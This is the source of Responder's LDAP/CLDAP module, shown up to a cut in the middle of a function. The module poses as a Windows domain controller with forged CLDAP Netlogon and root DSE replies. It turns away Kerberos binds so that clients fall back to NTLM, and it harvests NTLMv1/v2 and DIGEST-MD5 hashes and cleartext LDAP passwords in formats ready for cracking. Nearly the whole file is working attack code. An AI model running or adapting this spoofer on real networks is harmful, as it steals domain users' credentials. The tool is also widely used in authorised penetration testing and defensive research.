#!/usr/bin/env python
# This file is part of Responder, a network take-over set of tools 
# created and maintained by Laurent Gaffie.
# email: lgaffie@secorizon.com
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
import sys
if (sys.version_info > (3, 0)):
	from socketserver import BaseRequestHandler
else:
	from SocketServer import BaseRequestHandler
from packets import LDAPSearchDefaultPacket, LDAPSearchSupportedCapabilitiesPacket, LDAPSearchSupportedMechanismsPacket, LDAPNTLMChallenge, CLDAPNetlogon
from utils import *
import struct
import codecs
import random
import base64
import hashlib

# Global storage for client domain information from CLDAP
client_domain_info = {}  # Stores full domain info: {client_ip: {'domain': ..., 'guid': ..., 'netbios': ...}}

def extract_domain_info_from_cldap(data, client_ip):
	"""Extract complete domain information from CLDAP Netlogon request"""
	try:
		domain_info = {}
		
		# Extract DNS domain name
		dns_domain_idx = data.find(b'DnsDomain')
		if dns_domain_idx != -1:
			offset = dns_domain_idx + len('DnsDomain')
			domain_section = data[offset:offset+50]
			
			domain_bytes = []
			for i, b in enumerate(domain_section):
				if 32 <= b <= 126:
					domain_bytes.append(b)
				elif b == 0 and domain_bytes:
					break
			
			if domain_bytes:
				domain = bytes(domain_bytes).decode('latin-1', errors='ignore').strip().rstrip('.')
				if '.' in domain and len(domain) < 50:
					domain_info['domain'] = domain
		
		# Extract Domain GUID
		guid_idx = data.find(b'DomainGuid')
		if guid_idx != -1:
			offset = guid_idx + 10  # Skip 'DomainGuid' (10 bytes)
			if offset + 2 < len(data):
				# GUID structure: [tag] [length] [GUID bytes]
				# Skip tag byte (usually 0x04 for OCTET STRING)
				guid_len = data[offset + 1]
				if 0 < guid_len <= 16 and offset + 2 + guid_len <= len(data):
					guid_bytes = data[offset + 2:offset + 2 + guid_len]
					domain_info['guid'] = guid_bytes
		
		# Extract NtVer (NT version/capabilities flags)
		ntver_idx = data.find(b'NtVer')
		if ntver_idx != -1:
			offset = ntver_idx + len('NtVer')
			if offset + 6 < len(data):
				# NtVer is usually 4 bytes
				try:
					ntver_len = data[offset + 1]
					if ntver_len == 4:
						ntver_bytes = data[offset + 2:offset + 6]
						ntver = struct.unpack('<I', ntver_bytes)[0]
						domain_info['ntver'] = ntver
				except:
					pass
		
		# Extract DomainSid if present
		domsid_idx = data.find(b'DomainSid')
		if domsid_idx != -1:
			offset = domsid_idx + len('DomainSid')
			if offset + 30 < len(data):
				try:
					sid_len = data[offset + 1]
					if 8 <= sid_len <= 68:  # Valid SID length range
						sid_bytes = data[offset + 2:offset + 2 + sid_len]
						domain_info['domainsid'] = sid_bytes
				except:
					pass
		
		# Extract Host (client computer name) - just for logging
		host_idx = data.find(b'Host')
		if host_idx != -1:
			offset = host_idx + 4
			host_section = data[offset:offset+50]
			host_bytes = []
			for b in host_section:
				if 32 <= b <= 126:
					host_bytes.append(b)
				elif b == 0 and host_bytes:
					break
			if host_bytes:
				try:
					client_host = bytes(host_bytes).decode('latin-1', errors='ignore')
					if 3 <= len(client_host) <= 20:
						domain_info['client_host'] = client_host
				except:
					pass
		
		if domain_info and 'domain' in domain_info:
			if settings.Config.Verbose:
				guid_str = domain_info.get('guid', b'').hex() if 'guid' in domain_info else 'N/A'
				ntver_str = f"0x{domain_info['ntver']:08x}" if 'ntver' in domain_info else 'N/A'
				client_host = domain_info.get('client_host', 'N/A')
				print(text('[CLDAP] Client %s: domain=%s, guid=%s, ntver=%s, host=%s' % 
					(client_ip, domain_info['domain'], guid_str[:32], ntver_str, client_host)))
			
			client_domain_info[client_ip] = domain_info
			return domain_info
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[CLDAP] Error extracting domain info: %s' % str(e)))
	
	return None

def CalculateDNSName(name):
	if isinstance(name, bytes):
		name = name.decode('latin-1')
	name = name.split(".")
	DomainPrefix = struct.pack('B', len(name[0])).decode('latin-1')+name[0]
	Dnslen = ''
	for x in name:
		if len(x) >= 1:
			Dnslen += struct.pack('B', len(x)).decode('latin-1')+x
	return Dnslen, DomainPrefix

def ParseCLDAPNetlogon(data):
	try:
		Dns = data.find(b'DnsDomain')
		if Dns == -1:
			return None, None
		DnsName = data[Dns+9:]
		DnsGuidOff = data.find(b'DomainGuid')
		if DnsGuidOff == -1:
			return None, None
		Guid = data[DnsGuidOff+10:]
		if Dns:
			DomainLen = struct.unpack(">B", DnsName[1:2])[0]
			DomainName = DnsName[2:2+DomainLen]
		if Guid:
			DomainGuidLen = struct.unpack(">B", Guid[1:2])[0]
			DomainGuid = Guid[2:2+DomainGuidLen]
		return DomainName, DomainGuid
	except:
		pass
	return None, None

def encode_ldap_length(length):
	"""Encode length in ASN.1 format for LDAP"""
	if length < 128:
		return struct.pack('B', length)
	elif length < 256:
		return b'\x81' + struct.pack('B', length)
	elif length < 65536:
		return b'\x82' + struct.pack('>H', length)
	else:
		return b'\x83' + struct.pack('>I', length)[1:]

def ParseSearch(data, client_ip=None):
	# Extract Message ID properly
	try:
		offset = 1  # Skip SEQUENCE tag
		msg_len, consumed = parse_asn1_length(data, offset)
		offset += consumed
		
		# Skip to INTEGER tag for MessageID
		if data[offset] != 0x02:
			TID = '\x02'  # Default fallback
		else:
			offset += 1
			msgid_len, consumed = parse_asn1_length(data, offset)
			offset += consumed
			if msgid_len == 1:
				TID = data[offset:offset+1].decode('latin-1')
			else:
				TID = '\x02'  # Default fallback
	except:
		TID = '\x02'  # Default fallback
	
	if re.search(b'Netlogon', data):
		# Extract domain from CLDAP Netlogon request
		if client_ip:
			extract_domain_info_from_cldap(data, client_ip)
		
		# Generate realistic DC name based on extracted domain
		try:
			DomainName, DomainGuid = ParseCLDAPNetlogon(data)
		except Exception as e:
			if settings.Config.Verbose:
				print(text('[CLDAP] Parsing error: %s' % str(e)))
			DomainName = None
			DomainGuid = None
		
		# Generate DC hostname (just DC1, not domain-based)
		if DomainName:
			try:
				domain_str = DomainName.decode('latin-1', errors='ignore').strip().rstrip('.')
				NbtName = "DC1"
				if settings.Config.Verbose:
					print(text('[CLDAP] Generated DC name: %s (from domain: %s)' % (NbtName, domain_str)))
			except:
				NbtName = settings.Config.MachineName
		else:
			NbtName = settings.Config.MachineName
		
		TID = NetworkRecvBufferPython2or3(data[8:10])
		if TID[1] == "\x63":
			TID = "\x00"+TID[0]
		
		# Handle None DomainGuid
		if DomainGuid:
			DomainGuid = NetworkRecvBufferPython2or3(DomainGuid)
		else:
			# Use zero GUID (16 bytes of zeros) if we couldn't extract one
			DomainGuid = NetworkRecvBufferPython2or3(b'\x00' * 16)
			if settings.Config.Verbose:
				print(text('[CLDAP] Warning: Could not extract DomainGuid, using zero GUID'))
		
		# Handle None DomainName
		if not DomainName:
			DomainName = settings.Config.MachineName.encode('latin-1')
		
		# Decode and clean domain name
		domain_str_clean = DomainName.decode('latin-1', errors='ignore').strip().rstrip('.')
		DomainName_clean = domain_str_clean.encode('latin-1')
		
		# Extract domain NetBIOS name (first part before dot)
		domain_netbios = domain_str_clean.split('.')[0].upper()
		
		t = CLDAPNetlogon(MessageIDASNStr=TID, CLDAPMessageIDStr=TID, NTLogonDomainGUID=DomainGuid, NTLogonForestName=CalculateDNSName(DomainName_clean)[0], NTLogonPDCNBTName=CalculateDNSName(NbtName)[0], NTLogonDomainNBTName=CalculateDNSName(domain_netbios)[0], NTLogonDomainNameShort=CalculateDNSName(DomainName_clean)[1])
		t.calculate()
		return str(t)
	
	# Detect root DSE query (empty baseObject + objectclass=* filter)
	# Windows queries for various root DSE attributes - respond to all of them
	# Note: check both "objectClass" and "objectclass" since byte regex (?i) doesn't work in Python
	if (b'objectClass' in data or b'objectclass' in data) and (
		b'supportedSASLMechanisms' in data or 
		b'namingContexts' in data or 
		b'defaultNamingContext' in data or 
		b'supportedCapabilities' in data or
		b'supportedControl' in data or
		b'supportedLDAPVersion' in data or
		b'supportedLDAPPolicies' in data or
		b'dsServiceName' in data or
		b'dnsHostName' in data or
		b'serverName' in data or
		b'ldapServiceName' in data or
		b'subschemaSubentry' in data
	):
		# Build root DSE response
		MessageID = TID
		
		# Use client's domain info from CLDAP if available, otherwise use config
		domain = None
		domain_guid = None
		dc_hostname = None
		
		if client_ip and client_ip in client_domain_info:
			domain_info = client_domain_info[client_ip]
			domain = domain_info.get('domain')
			domain_guid = domain_info.get('guid')
			
			# Generate DC hostname (just DC1)
			dc_hostname = "DC1"
			
			if settings.Config.Verbose:
				guid_str = domain_guid.hex()[:32] if domain_guid else 'N/A'
				print(text('[LDAP] Using client domain info: domain=%s, guid=%s, dc_name=%s' % (domain, guid_str, dc_hostname)))
		
		if not domain:
			domain = settings.Config.MachineName.upper()
		
		if not dc_hostname:
			# Fallback: use config machine name but make it look like a DC
			dc_hostname = settings.Config.MachineName
		
		# Domain components - strip trailing dots and filter empty parts
		domain = domain.strip().rstrip('.')  # Remove trailing dot if present
		
		if '.' in domain:
			domain_parts = [part for part in domain.upper().split('.') if part]  # Filter empty strings
		else:
			domain_parts = [domain.upper(), 'LOCAL']
		
		# Build DN strings for serverName attribute
		domain_dn = ','.join(['DC=' + part for part in domain_parts])
		config_dn = 'CN=Configuration,' + domain_dn
		server_name = 'CN=' + dc_hostname + ',CN=Servers,CN=Default-First-Site-Name,CN=Sites,' + config_dn
		
		# Build full DNS hostname for the DC
		dc_fqdn = dc_hostname + '.' + domain
		
		# CRITICAL: Real DCs only return a MINIMAL set of attributes for root DSE queries
		# Based on analysis of real DC (WIN-H4M1G51C701), return ONLY these 8 core attributes:
		# This matches the exact behavior of a real Windows DC
		attrs = {
			'dnsHostName': [dc_fqdn],
			'ldapServiceName': [domain_parts[0] + ':' + dc_hostname + '@' + domain],
			'serverName': [server_name],
			'supportedCapabilities': ['1.2.840.113556.1.4.800', '1.2.840.113556.1.4.1670', '1.2.840.113556.1.4.1791', '1.2.840.113556.1.4.1935'],
			'supportedControl': ['1.2.840.113556.1.4.319', '1.2.840.113556.1.4.801', '1.2.840.113556.1.4.473', '1.2.840.113556.1.4.528', '1.2.840.113556.1.4.417', '1.2.840.113556.1.4.619', '1.2.840.113556.1.4.841', '1.2.840.113556.1.4.529', '1.2.840.113556.1.4.805', '1.2.840.113556.1.4.521', '1.2.840.113556.1.4.970', '1.2.840.113556.1.4.1338', '1.2.840.113556.1.4.474', '1.2.840.113556.1.4.1339', '1.2.840.113556.1.4.1340', '1.2.840.113556.1.4.1413', '2.16.840.1.113730.3.4.9', '2.16.840.1.113730.3.4.10', '1.2.840.113556.1.4.1504', '1.2.840.113556.1.4.1852', '1.2.840.113556.1.4.802', '1.2.840.113556.1.4.1907', '1.2.840.113556.1.4.1948', '1.2.840.113556.1.4.1974', '1.2.840.113556.1.4.1341', '1.2.840.113556.1.4.2026', '1.2.840.113556.1.4.2064', '1.2.840.113556.1.4.2065', '1.2.840.113556.1.4.2066'],
			'supportedLDAPPolicies': ['MaxPoolThreads', 'MaxDatagramRecv', 'MaxReceiveBuffer', 'InitRecvTimeout', 'MaxConnections', 'MaxConnIdleTime', 'MaxPageSize', 'MaxQueryDuration', 'MaxTempTableSize', 'MaxResultSetSize', 'MaxNotificationPerConn', 'MaxValRange'],
			'supportedLDAPVersion': ['3', '2'],
			'supportedSASLMechanisms': ['GSSAPI', 'GSS-SPNEGO', 'NTLM', 'EXTERNAL', 'DIGEST-MD5'],
		}
		
		# NOTE: We do NOT return these attributes (real DC doesn't return them for root DSE queries):
		# - subschemaSubentry, dsServiceName, defaultNamingContext, namingContexts
		# - configurationNamingContext, schemaNamingContext, rootDomainNamingContext
		# - domainFunctionality, forestFunctionality, domainControllerFunctionality
		# - isGlobalCatalogReady, isSynchronized
		# Returning these causes Windows to reject us as not a real DC!
		
		# Build all attributes
		all_attrs = b''
		
		for attr_name, attr_values in attrs.items():
			# Build attribute SEQUENCE
			attr_type = b'\x04' + encode_ldap_length(len(attr_name)) + attr_name.encode('latin-1')
			
			# Build values SET
			vals_content = b''
			for val in attr_values:
				val_bytes = val.encode('latin-1')
				vals_content += b'\x04' + encode_ldap_length(len(val_bytes)) + val_bytes
			
			attr_vals = b'\x31' + encode_ldap_length(len(vals_content)) + vals_content
			
			attr_content = attr_type + attr_vals
			attr = b'\x30' + encode_ldap_length(len(attr_content)) + attr_content
			all_attrs += attr
		
		attrs_seq = b'\x30' + encode_ldap_length(len(all_attrs)) + all_attrs
		
		# Build SearchResultEntry
		object_name = b'\x04\x00'  # Empty for root DSE
		search_entry_content = object_name + attrs_seq
		search_entry = b'\x64' + encode_ldap_length(len(search_entry_content)) + search_entry_content
		
		# Build LDAPMessage
		msgid_bytes = b'\x02\x01' + MessageID.encode('latin-1')
		msg_content = msgid_bytes + search_entry
		msg = b'\x30' + encode_ldap_length(len(msg_content)) + msg_content
		
		# SearchResultDone
		result_done = b'\x65\x07\x0a\x01\x00\x04\x00\x04\x00'
		done_msg_content = msgid_bytes + result_done
		done_msg = b'\x30' + encode_ldap_length(len(done_msg_content)) + done_msg_content
		
		return (msg + done_msg).decode('latin-1')
	
	# If no specific root DSE query matched, return generic response
	return None

def ParseLDAPHash(data, client, Challenge):
	"""Parse LDAP NTLMSSP v1/v2"""
	SSPIStart = data.find(b'NTLMSSP')
	if SSPIStart == -1:
		return
	
	SSPIString = data[SSPIStart:]
	if len(SSPIString) < 64:
		return
	
	try:
		LMhashLen    = struct.unpack('<H', data[SSPIStart+14:SSPIStart+16])[0]
		LMhashOffset = struct.unpack('<H', data[SSPIStart+16:SSPIStart+18])[0]
		LMHash       = SSPIString[LMhashOffset:LMhashOffset+LMhashLen]
		LMHash       = codecs.encode(LMHash, 'hex').upper().decode('latin-1')
		
		NthashLen    = struct.unpack('<H', data[SSPIStart+20:SSPIStart+22])[0]
		NthashOffset = struct.unpack('<H', data[SSPIStart+24:SSPIStart+26])[0]
		
		# NTLMv1
		if NthashLen == 24:
			SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
			SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
			DomainLen    = struct.unpack('<H', SSPIString[30:32])[0]
			DomainOffset = struct.unpack('<H', SSPIString[32:34])[0]
			Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
			UserLen      = struct.unpack('<H', SSPIString[38:40])[0]
			UserOffset   = struct.unpack('<H', SSPIString[40:42])[0]
			Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
			
			# Get hostname
			HostnameLen    = struct.unpack('<H', SSPIString[46:48])[0]
			HostnameOffset = struct.unpack('<H', SSPIString[48:50])[0]
			if HostnameLen > 0 and HostnameOffset + HostnameLen <= len(SSPIString):
				Hostname = SSPIString[HostnameOffset:HostnameOffset+HostnameLen].decode('UTF-16LE', errors='ignore')
			else:
				Hostname = ''
			
			WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, LMHash, SMBHash, codecs.encode(Challenge, 'hex').decode('latin-1'))
			
			SaveToDb({
				'module': 'LDAP',
				'type': 'NTLMv1-SSP',
				'client': client,
				'hostname': Hostname,
				'user': Domain+'\\'+Username,
				'hash': SMBHash,
				'fullhash': WriteHash,
			})
		
		# NTLMv2
		elif NthashLen > 60:
			SMBHash      = SSPIString[NthashOffset:NthashOffset+NthashLen]
			SMBHash      = codecs.encode(SMBHash, 'hex').upper().decode('latin-1')
			DomainLen    = struct.unpack('<H', SSPIString[30:32])[0]
			DomainOffset = struct.unpack('<H', SSPIString[32:34])[0]
			Domain       = SSPIString[DomainOffset:DomainOffset+DomainLen].decode('UTF-16LE')
			UserLen      = struct.unpack('<H', SSPIString[38:40])[0]
			UserOffset   = struct.unpack('<H', SSPIString[40:42])[0]
			Username     = SSPIString[UserOffset:UserOffset+UserLen].decode('UTF-16LE')
			
			# Get hostname
			HostnameLen    = struct.unpack('<H', SSPIString[46:48])[0]
			HostnameOffset = struct.unpack('<H', SSPIString[48:50])[0]
			if HostnameLen > 0 and HostnameOffset + HostnameLen <= len(SSPIString):
				Hostname = SSPIString[HostnameOffset:HostnameOffset+HostnameLen].decode('UTF-16LE', errors='ignore')
			else:
				Hostname = ''
			
			WriteHash = '%s::%s:%s:%s:%s' % (Username, Domain, codecs.encode(Challenge, 'hex').decode('latin-1'), SMBHash[:32], SMBHash[32:])
			
			SaveToDb({
				'module': 'LDAP',
				'type': 'NTLMv2-SSP',
				'client': client,
				'hostname': Hostname,
				'user': Domain+'\\'+Username,
				'hash': SMBHash,
				'fullhash': WriteHash,
			})
		
		if LMhashLen < 2 and settings.Config.Verbose:
			print(text("[LDAP] Ignoring anonymous NTLM authentication"))
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[LDAP] Error parsing NTLM hash: %s' % str(e)))

def ParseDIGESTMD5(data, client, Challenge):
	"""Parse DIGEST-MD5 SASL mechanism responses"""
	try:
		# Look for DIGEST-MD5 response
		digest_start = data.find(b'username="')
		if digest_start == -1:
			return None
		
		# Extract the digest response data
		response_str = data[digest_start:].decode('latin-1', errors='ignore')
		
		# Parse out the username
		username_match = re.search(r'username="([^"]+)"', response_str)
		realm_match = re.search(r'realm="([^"]+)"', response_str)
		nonce_match = re.search(r'nonce="([^"]+)"', response_str)
		cnonce_match = re.search(r'cnonce="([^"]+)"', response_str)
		nc_match = re.search(r'nc=([0-9a-fA-F]+)', response_str)
		qop_match = re.search(r'qop=([a-z\-]+)', response_str)
		uri_match = re.search(r'digest-uri="([^"]+)"', response_str)
		response_match = re.search(r'response=([0-9a-fA-F]+)', response_str)
		
		if username_match and response_match:
			username = username_match.group(1)
			realm = realm_match.group(1) if realm_match else ''
			nonce = nonce_match.group(1) if nonce_match else ''
			cnonce = cnonce_match.group(1) if cnonce_match else ''
			nc = nc_match.group(1) if nc_match else ''
			qop = qop_match.group(1) if qop_match else ''
			uri = uri_match.group(1) if uri_match else ''
			response = response_match.group(1)
			
			# Format for hashcat/john
			hash_string = '%s:$sasl$DIGEST-MD5$%s$%s$%s$%s$%s$%s$%s' % (username, realm, nonce, cnonce, nc, qop, uri, response)
			
			SaveToDb({
				'module': 'LDAP',
				'type': 'DIGEST-MD5',
				'client': client,
				'user': username,
				'hash': response,
				'fullhash': hash_string,
			})
			
			print(color("[*] [LDAP] Captured DIGEST-MD5 hash from %s for user %s" % (client.replace("::ffff:", ""), username), 3, 1))
			return True
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[LDAP] Error parsing DIGEST-MD5: %s' % str(e)))
	
	return None

def ParsePLAINSASL(data, client):
	"""Parse PLAIN SASL mechanism (cleartext credentials)"""
	try:
		# PLAIN SASL format: [authzid]\x00authcid\x00password
		# Find the SASL credentials in the packet
		sasl_start = data.find(b'\x04')  # Octet string tag
		if sasl_start == -1:
			return None
		
		# Skip the tag and length bytes
		sasl_data = data[sasl_start+2:]
		
		# Split by null bytes
		parts = sasl_data.split(b'\x00')
		if len(parts) >= 3:
			authzid = parts[0].decode('utf-8', errors='ignore')
			username = parts[1].decode('utf-8', errors='ignore')
			password = parts[2].decode('utf-8', errors='ignore')
			
			if username and password:
				SaveToDb({
					'module': 'LDAP',
					'type': 'PLAIN-SASL',
					'client': client,
					'user': username,
					'cleartext': password,
					'fullhash': username + ':' + password,
				})
				
				print(color("[*] [LDAP] Captured PLAIN SASL credentials from %s for user %s" % (client.replace("::ffff:", ""), username), 2, 1))
				return True
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[LDAP] Error parsing PLAIN SASL: %s' % str(e)))
	
	return None

def DetectSASLMechanism(data):
	"""Detect which SASL mechanism is being used"""
	try:
		if b'NTLMSSP' in data:
			return 'NTLM'
		elif b'DIGEST-MD5' in data or b'digest-uri=' in data:
			return 'DIGEST-MD5'
		elif b'PLAIN' in data:
			return 'PLAIN'
		elif b'GSSAPI' in data or b'GSS-SPNEGO' in data:
			# Try to extract NTLMSSP from GSSAPI wrapper
			if b'NTLMSSP' in data:
				return 'GSSAPI-NTLM'
			# Check for Kerberos
			if b'KRB5' in data or b'\x6e\x82' in data:  # Kerberos AP-REQ
				return 'GSSAPI-KERBEROS'
			return 'GSSAPI'
	except:
		pass
	return None

def BuildAuthMethodNotSupportedResponse(MessageID):
	"""Build LDAP BindResponse with authMethodNotSupported (7) result code"""
	# This forces the client to fall back to NTLM instead of Kerberos
	
	# MessageID (copy from request)
	if isinstance(MessageID, bytes):
		msgid_bytes = MessageID
	elif isinstance(MessageID, str):
		msgid_bytes = MessageID.encode('latin-1')
	else:
		msgid_bytes = b'\x02'  # Default
	
	# Build BindResponse content
	# ResultCode: authMethodNotSupported (7)
	result_code = b'\x0a\x01\x07'  # ENUMERATED, length 1, value 7
	
	# MatchedDN: empty
	matched_dn = b'\x04\x00'  # OCTET STRING, length 0
	
	# DiagnosticMessage: "Authentication method not supported. Please use NTLM."
	diag_msg = b'Authentication method not supported. Please use NTLM.'
	diag_msg_encoded = b'\x04' + encode_ldap_length(len(diag_msg)) + diag_msg
	
	# BindResponse content
	bind_content = result_code + matched_dn + diag_msg_encoded
	
	# BindResponse (APPLICATION 1 = 0x61)
	bind_response = b'\x61' + encode_ldap_length(len(bind_content)) + bind_content
	
	# MessageID (INTEGER)
	if len(msgid_bytes) == 1:
		msgid_encoded = b'\x02\x01' + msgid_bytes
	else:
		msgid_encoded = b'\x02' + encode_ldap_length(len(msgid_bytes)) + msgid_bytes
	
	# Complete message
	ldap_msg = msgid_encoded + bind_response
	
	# SEQUENCE wrapper
	complete = b'\x30' + encode_ldap_length(len(ldap_msg)) + ldap_msg
	
	return complete

def ParseNTLM(data, client, Challenge):
	"""Parse NTLM authentication"""
	# Extract Message ID properly
	try:
		offset = 1  # Skip SEQUENCE tag
		msg_len, consumed = parse_asn1_length(data, offset)
		offset += consumed
		
		# Skip to INTEGER tag for MessageID
		if data[offset] != 0x02:
			MessageID = '\x02'  # Default fallback
		else:
			offset += 1
			msgid_len, consumed = parse_asn1_length(data, offset)
			offset += consumed
			if msgid_len == 1:
				MessageID = data[offset:offset+1].decode('latin-1')
			else:
				MessageID = '\x02'  # Default fallback
	except:
		MessageID = '\x02'  # Default fallback
	
	if re.search(b'(NTLMSSP\x00\x01\x00\x00\x00)', data):
		# NTLMSSP NEGOTIATE - send CHALLENGE
		if settings.Config.Verbose:
			print(text('[LDAP] NTLMSSP NEGOTIATE from %s' % client.replace("::ffff:", "")))
		NTLMChall = LDAPNTLMChallenge(MessageIDASNStr=MessageID, NTLMSSPNtServerChallenge=NetworkRecvBufferPython2or3(Challenge))
		NTLMChall.calculate()
		return NTLMChall
	
	elif re.search(b'(NTLMSSP\x00\x03\x00\x00\x00)', data):
		# NTLMSSP AUTH - parse hash
		if settings.Config.Verbose:
			print(text('[LDAP] NTLMSSP AUTH from %s' % client.replace("::ffff:", "")))
		ParseLDAPHash(data, client, Challenge)
		# Return special marker to close connection after auth
		return 'CLOSE_CONNECTION'

def ParseCLDAPPacket(data, client, Challenge):
	try:
		# Parse LDAP message structure properly
		if len(data) < 6:
			return None
		
		offset = 0
		
		# SEQUENCE tag (0x30)
		if data[offset] != 0x30:
			return None
		offset += 1
		
		# Parse message length
		msg_len, consumed = parse_asn1_length(data, offset)
		offset += consumed
		
		# Parse Message ID
		if offset >= len(data) or data[offset] != 0x02:  # INTEGER
			return None
		offset += 1
		
		msgid_len, consumed = parse_asn1_length(data, offset)
		offset += consumed
		
		if offset + msgid_len > len(data):
			return None
		
		MessageID = data[offset:offset+msgid_len]
		offset += msgid_len
		
		# Get operation type
		if offset >= len(data):
			return None
		
		Operation = data[offset:offset+1]
		
		if Operation == b'\x60':  # Bind
			# Parse bind request
			offset += 1
			bind_len, consumed = parse_asn1_length(data, offset)
			offset += consumed
			
			# LDAP version
			if offset >= len(data) or data[offset] != 0x02:
				return None
			offset += 1
			version_len, consumed = parse_asn1_length(data, offset)
			offset += consumed
			offset += version_len
			
			# Name (DN)
			if offset >= len(data) or data[offset] != 0x04:
				return None
			offset += 1
			name_len, consumed = parse_asn1_length(data, offset)
			offset += consumed
			
			UserDomain = data[offset:offset+name_len].decode('latin-1', errors='ignore')
			offset += name_len
			
			if offset >= len(data):
				return None
			
			AuthHeaderType = data[offset:offset+1]
			
			# Simple bind (cleartext)
			if AuthHeaderType == b'\x80':
				offset += 1
				pass_len, consumed = parse_asn1_length(data, offset)
				offset += consumed
				
				Password = data[offset:offset+pass_len].decode('latin-1', errors='ignore')
				
				SaveToDb({
					'module': 'LDAP',
					'type': 'Cleartext',
					'client': client,
					'user': UserDomain,
					'cleartext': Password,
					'fullhash': UserDomain+':'+Password,
				})
				return 'CLOSE_CONNECTION'
			
			# SASL bind (0xA3)
			if AuthHeaderType == b'\xA3':
				# Detect mechanism
				mechanism = DetectSASLMechanism(data)
				if mechanism == 'NTLM' or mechanism == 'GSSAPI-NTLM':
					Buffer = ParseNTLM(data, client, Challenge)
					return Buffer
				elif mechanism == 'GSSAPI-KERBEROS' or mechanism == 'GSSAPI':
					# Client is trying Kerberos - reject it to force NTLM fallback
					if settings.Config.Verbose:
						print(text('[LDAP] Rejecting Kerberos auth from %s, forcing NTLM fallback' % client.replace("::ffff:", "")))
					
					# Extract MessageID to use in response
					try:
						msg_offset = 1  # Skip SEQUENCE tag
						msg_len, consumed = parse_asn1_length(data, msg_offset)
						msg_offset += consumed
						
						if data[msg_offset] == 0x02:  # INTEGER tag
							msg_offset += 1
							msgid_len, consumed = parse_asn1_length(data, msg_offset)
							msg_offset += consumed
							MessageIDBytes = data[msg_offset:msg_offset+msgid_len]
						else:
							MessageIDBytes = b'\x02'
					except:
						MessageIDBytes = b'\x02'
					
					# Send authMethodNotSupported response
					Buffer = BuildAuthMethodNotSupportedResponse(MessageIDBytes)
					return Buffer
				elif mechanism == 'DIGEST-MD5':
					ParseDIGESTMD5(data, client, Challenge)
				elif mechanism == 'PLAIN':
					ParsePLAINSASL(data, client)
				elif mechanism and settings.Config.Verbose:
					print(text('[LDAP] Detected SASL mechanism: %s from %s' % (mechanism, client.replace("::ffff:", ""))))
				return None
		
		elif Operation == b'\x63':  # Search
			Buffer = ParseSearch(data, client)
			print(text('[CLDAP] Sent CLDAP pong to %s.' % client.replace("::ffff:", "")))
			return Buffer
		
		elif settings.Config.Verbose:
			print(text('[CLDAP] Operation not supported'))
	
	except Exception as e:
		if settings.Config.Verbose:
			print(text('[CLDAP] Parsing error: %s' % str(e)))
	
	return None

def parse_asn1_length(data, offset):
	"""Parse ASN.1 length field"""
	if offset >= len(data):
		return 0, 0
	
	first_byte = data[offset]
	
	# Short form (length < 128)
	if first_byte < 0x80:
		return first_byte, 1
	
	# Long form
	num_octets = first_byte & 0x7F
	if num_octets == 0 or offset + 1 + num_octets > len(data):
		return 0, 0
	
	length = 0
	for i in range(num_octets):
		length = (length << 8) | data[offset + 1 + i]
	
	return length, 1 + num_octets

def ParseLDAPPacket(data, client, Challenge):
	try:
		# Parse LDAP message structure properly
		if len(data) < 6:
			return None
		
		offset = 0
		
		# SEQUENCE tag (0x30)
		if data[offset] != 0x30:
			return None
		offset += 1
		
		# Parse message length
		msg_len, consumed = parse_asn1_length(data, offset)
		offset += consumed
		
		# Parse Message ID
		if offset >= len(data) or data[offset] != 0x02:  # INTEGER
			return None
		offset += 1
		
		msgid_len, consumed = parse_asn1_length(data, offset)
		offset += consumed
		
		if offset + msgid_len > len(data):
			return None
		
		MessageID = data[offset:offset+msgid_len]
		offset += msgid_len
		
		# Get operation type
		if offset >= len(data):
			return None
		
		Operation = data[offset:offset+1]
		
		if Operation == b'\x60':  # Bind
			# Parse bind request
			offset += 1
			bind_len, consumed = parse_asn1_length(data, offset)
			offset += consumed
			
			# LDAP version
			if offset >= len(data) or data[offset] != 0x02:
				return None
			offset += 1
			version_len, consumed = parse_asn1_length(data, offset)
			offset += consumed
			offset += version_len
			
			# Name (DN)
			if offset >= len(data) or data[offset] != 0x04:
				return None
			offset += 1
			name_len, consumed = parse_asn1_length(data, offset)
			offset += consumed
			
			UserDomain = data[offset:offset+name_len].decode('latin-1', errors='ignore')
			offset += name_len
			
			if offset >= len(data):
				return None
			
			AuthHeaderType = data[offset:offset+1]
			
			# Simple bind (cleartext)
			if AuthHeaderType == b'\x80':
				offset += 1
				pass_len, consumed = parse_asn1_length(data, offset)
				offset += consumed
				
				Password = data[offset:offset+pass_len].decode('latin-1', errors='ignore')
				
				SaveToDb({
					'module': 'LDAP',
					'type': 'Cleartext',
					'client': client,
					'user': UserDomain,
					'cleartext': Password,
					'fullhash': UserDomain+':'+Password,
				})
				return 'CLOSE_CONNECTION'
			
			# SASL bind (0xA3)
			if AuthHeaderType == b'\xA3':
				# Detect mechanism
				mechanism = DetectSASLMechanism(data)
				if mechanism == 'NTLM' or mechanism == 'GSSAPI-NTLM':
					Buffer = ParseNTLM(data, client, Challenge)
					return Buffer
				elif mechanism == 'GSSAPI-KERBEROS' or mechanism == 'GSSAPI':
					# Client is trying Kerberos - reject it to force NTLM fallback
					if settings.Config.Verbose:
						print(text('[LDAP] Rejecting Kerberos auth from %s, forcing NTLM fallback' % client.replace("::ffff:", "")))
					
					# Extract MessageID to use in response
					try:
						msg_offset = 1  # Skip SEQUENCE tag
						msg_len, consumed = parse_asn1_length(data, msg_offset)
						msg_offset += consumed
						
						if data[msg_offset] == 0x02:  # INTEGER tag
							msg_offset += 1
							msgid_len, consumed = parse_asn1_length(data, msg_offset)
							msg_offset += consumed
							MessageIDBytes = data[msg_offset:msg_offset+msgid_len]
						else:
							MessageIDBytes = b'\x02'
					except:
